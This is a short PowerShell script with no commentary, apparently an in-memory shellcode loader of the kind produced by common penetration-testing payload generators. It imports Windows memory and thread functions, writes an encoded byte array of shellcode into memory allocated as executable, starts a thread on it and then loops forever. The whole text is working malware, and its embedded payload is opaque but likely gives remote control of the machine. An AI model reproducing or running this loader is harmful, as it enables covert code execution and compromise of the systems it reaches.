
$TuI = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $TuI -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0x42,0xfe,0x4c,0x4a,0xdb,0xd4,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x52,0x31,0x70,0x13,0x03,0x70,0x13,0x83,0xc0,0x46,0x1c,0xb9,0xb6,0xae,0x62,0x42,0x47,0x2e,0x03,0xca,0xa2,0x1f,0x03,0xa8,0xa7,0x0f,0xb3,0xba,0xea,0xa3,0x38,0xee,0x1e,0x30,0x4c,0x27,0x10,0xf1,0xfb,0x11,0x1f,0x02,0x57,0x61,0x3e,0x80,0xaa,0xb6,0xe0,0xb9,0x64,0xcb,0xe1,0xfe,0x99,0x26,0xb3,0x57,0xd5,0x95,0x24,0xdc,0xa3,0x25,0xce,0xae,0x22,0x2e,0x33,0x66,0x44,0x1f,0xe2,0xfd,0x1f,0xbf,0x04,0xd2,0x2b,0xf6,0x1e,0x37,0x11,0x40,0x94,0x83,0xed,0x53,0x7c,0xda,0x0e,0xff,0x41,0xd3,0xfc,0x01,0x85,0xd3,0x1e,0x74,0xff,0x20,0xa2,0x8f,0xc4,0x5b,0x78,0x05,0xdf,0xfb,0x0b,0xbd,0x3b,0xfa,0xd8,0x58,0xcf,0xf0,0x95,0x2f,0x97,0x14,0x2b,0xe3,0xa3,0x20,0xa0,0x02,0x64,0xa1,0xf2,0x20,0xa0,0xea,0xa1,0x49,0xf1,0x56,0x07,0x75,0xe1,0x39,0xf8,0xd3,0x69,0xd7,0xed,0x69,0x30,0xbf,0x9f,0x14,0xbf,0x3f,0x08,0xa0,0x56,0x51,0xa1,0x1a,0xc1,0xe1,0x46,0x85,0x16,0x06,0x7d,0xf8,0xc3,0xab,0x2d,0xa8,0xa0,0x18,0xba,0x74,0x11,0xe7,0x9d,0x76,0x48,0x44,0xb1,0xe2,0x70,0x39,0x66,0x9b,0x4f,0x8d,0x88,0x5b,0x58,0x95,0x88,0x5b,0x98,0x4a,0xce,0x76,0xaf,0xac,0xa9,0x88,0x9f,0xa4,0x1e,0x00,0x80,0xf2,0x5e,0xc7,0x36,0x3c,0xf3,0x80,0x48,0xc2,0x94,0xd4,0x1a,0x91,0x07,0x82,0xcf,0x43,0xc0,0xc7,0xa5,0x45,0x2b,0xe7,0x93,0x0f,0x21,0x1d,0x43,0x7c,0xe5,0x72,0x28,0xd4,0x61,0x58,0xc8,0xc0,0x0a,0x5d,0x01,0x75,0x2c,0xd4,0xa0,0x3a,0xd8,0xfa,0xdd,0x34,0x97,0xa7,0x48,0x4b,0x0d,0xcd,0x34,0xdb,0xae,0x02,0xb5,0x1b,0xc7,0x22,0xb5,0x5b,0x17,0x70,0xdd,0x03,0xb3,0x25,0xf8,0x4c,0x6e,0x5a,0x51,0xe1,0x18,0xba,0x01,0x6d,0x1b,0x65,0xae,0x6d,0x48,0x33,0xc6,0x7f,0xf8,0x32,0xf4,0x80,0xd1,0xc0,0x39,0x0a,0x17,0x41,0xbe,0xf3,0x64,0xd3,0x01,0x86,0x8f,0x84,0x42,0x37,0xb8,0xbc,0xba,0x38,0xc7,0x8e,0x7d,0xf4,0x16,0xc0,0x4b,0xc0,0x48,0x16,0x9a,0x01,0xa5,0x63,0xe2;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$chO=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($chO.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$chO,0,0,0);for (;;){Start-sleep 60};

